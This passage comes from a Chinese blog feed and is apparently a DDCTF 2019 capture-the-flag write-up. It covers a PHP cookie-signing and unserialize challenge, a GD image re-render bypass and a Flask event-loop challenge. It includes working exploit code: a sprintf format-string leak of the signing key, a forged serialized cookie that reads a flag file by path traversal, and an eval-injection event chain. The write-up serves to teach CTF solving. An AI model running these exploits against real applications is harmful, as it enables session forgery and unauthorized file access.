&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure><p>查看session.php代码可知，主要逻辑在session_read和session_create两个功能，session_create建立cookie并签名，session_read验证签名然后反序列化，而在Session类继承的__destruct方法中存在文件读取，所以本题的思路就是利用反序列化来读取flag。<br>为了破解签名，我们需要知道eancrykey，题目中存在如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该段代码将eancrykey也放进了数组中，所以我们可以利用nickname中的%s将其输出，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$key = <span class="string">'aesm1p'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'snow %s'</span>,$key);</span><br><span class="line">$data = <span class="string">"welcome %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">$data = sprintf($data,$v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure></p><p>可以得到结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome snow aesm1p</span><br></pre></td></tr></table></figure><p>提交的时候必须要加上didictf_username头</p><p><img src="/2020/09/13/DDCTF2019/1.png" alt></p><p>成功读取到秘钥值为<code>EzblrbNS</code>，接下里就是反序列化，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">$a = <span class="keyword">new</span> Session();</span><br><span class="line">$a-&gt;path = <span class="string">'..././config/flag.txt'</span>;</span><br><span class="line"></span><br><span class="line">$cookiedata = serialize($a);</span><br><span class="line">$cookiedata = $cookiedata.md5($key.$cookiedata);</span><br><span class="line"><span class="keyword">echo</span> $cookiedata.<span class="string">'  '</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($cookiedata);</span><br></pre></td></tr></table></figure><p>修改cookie即可得到flag</p><p><img src="/2020/09/13/DDCTF2019/2.png" alt></p><p>flag: <code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p><h1 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h1><p>我们上传之后的图片会被二次渲染，查看返回的图片可以看到<code>gd-jpeg v1.0</code>，是php的gd库渲染的，本题的考点是gd二次渲染绕过，要求我们将payload<br>[phpinfo();]写入图片中，可以用工具跑一下（修改写入的payload），然后就会生成符合条件的图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php jpg_payload.php imga_name</span><br></pre></td></tr></table></figure><p>PS：可能需要多次才能成功，试一些比较大的图片成功率高，还有就是在linux下做，不要在windows下进行尝试</p><p>然后提交图片即可</p><p>flag：<code>DDCTF{B3s7_7ry_php1nf0_57d79f001ace9fad}</code></p><h1 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h1><p>源代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f66147e657'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">    </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>这是一个flask系统，但是却与普通的flask系统不同，正常flask系统是通过<code>app.route</code>来编写路由的，而本题中却是维护了一个事件队列来进行路由，按照先进先出的规则处理事件，通过分割我们输入的查询字符串来处理事件，通读代码我们可以发现存在一个敏感函数eval()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>其实此处可以不使用eval函数的，而且由于action参数可控，导致我们可以注入恶意函数进去（用#注释掉action后面的内容），比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">action,is_action = <span class="string">'int#'</span>,<span class="literal">False</span></span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line"><span class="comment"># ret_val = event_handler(args)</span></span><br><span class="line"><span class="keyword">print</span> event_handler(<span class="number">1.1</span>)</span><br></pre></td></tr></table></figure><p>此时可以成功执行int函数</p><p>想要得到flag的话需要调用<code>get_flag_hander()</code>函数，查看代码可知需要<code>session[&#39;num_items&#39;] &gt;= 5</code>即可将flag写入session，此处需要我们购买5个钻石</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br></pre></td></tr></table></figure><p>查看此处代码发现存在明显的逻辑问题，即购买时系统先完成购买<code>session[&#39;num_items&#39;] += num_items</code>，然后才触发事件检验金额是否足够<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，如果不够的话进行回滚，这样的话在该回滚事件执行之前我们可以短暂的成功购买，此时执行get_flag函数即可成功执行，我们可以构建一个这样的事件队列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buy-&gt;get_flag-&gt;consume_point</span><br></pre></td></tr></table></figure><p>结合上面的eval函数漏洞，我们可以实现该攻击，trigger_event函数可以将事件插入队列，我们可以利用该函数将buy和get_flag函数插入队列</p><p><img src="/2020/09/13/DDCTF2019/3.png" alt></p><p>解密session即可得到flag</p><p>flag: <code>DDCTF{3v41_3v3nt_1O0p_aNd_fLASK_cOOk1e}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://chaosec.top/categories/CTF/"/>
    
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒月赛复现集合</title>
    <link href="http://chaosec.top/2020/09/13/month-race/"/>
    <id>http://chaosec.top/2020/09/13/month-race/</id>
    <published>2020-09-13T12:26:04.000Z</published>
    <updated>2020-09-13T12:26:04.053Z</updated>
    
